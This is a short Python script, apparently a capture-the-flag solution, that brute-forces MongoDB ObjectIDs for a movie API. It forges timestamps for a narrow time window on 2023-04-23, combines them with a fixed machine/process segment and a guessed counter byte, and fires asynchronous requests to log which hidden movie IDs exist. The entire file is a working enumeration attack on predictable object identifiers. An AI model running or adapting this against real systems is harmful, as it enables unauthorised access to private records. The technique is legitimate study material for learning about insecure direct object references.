import asyncio
from datetime import datetime
from colorama import Fore, Style, init
import aiohttp
import random

init()
host = 'https://moviedb-5yorlifgkyrlg.hexbirch.com/'
number_of_potential_films = 0
list_of_found_movies = []
rand = (random.randint(50, 150) / 1000)


async def fetch_movie(session, movie_id, count):
    async with session.get(f'{host}/api/movie?genre=action&movie_id={movie_id}') as response:
        text = await response.text()
        print(text)
        if '"error":"movie not found"' in text:
            print("Movie not found " + Fore.RED + movie_id + Fore.BLUE + " - ["
                  + str(count) + "]" + Style.RESET_ALL)
        else:
            print("Movie was found " + Fore.GREEN + movie_id + Fore.YELLOW + " - ["
                  + str(count) + "]" + Style.RESET_ALL)
            list_of_found_movies.append(movie_id)


async def main():
    global number_of_potential_films
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(18, 20):
            for j in range(27, 60):
                for k in range(208, 256):
                    number_of_potential_films += 1
                    forged_datetime = f'2023-04-23 09:{i}:{j}'
                    forged_datetime_obj = datetime.strptime(forged_datetime, '%Y-%m-%d %H:%M:%S')
                    timestamp = forged_datetime_obj.timestamp()
                    timestamp2hex = hex(int(timestamp)).replace('0x', '')
                    bf = hex(k).replace('0x', '')
                    forged_mongodb = f'{timestamp2hex}869e32bbc4647d{bf}'
                    tasks.append(fetch_movie(session, forged_mongodb, number_of_potential_films))
                    await asyncio.sleep(rand)
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
    print(list_of_found_movies)
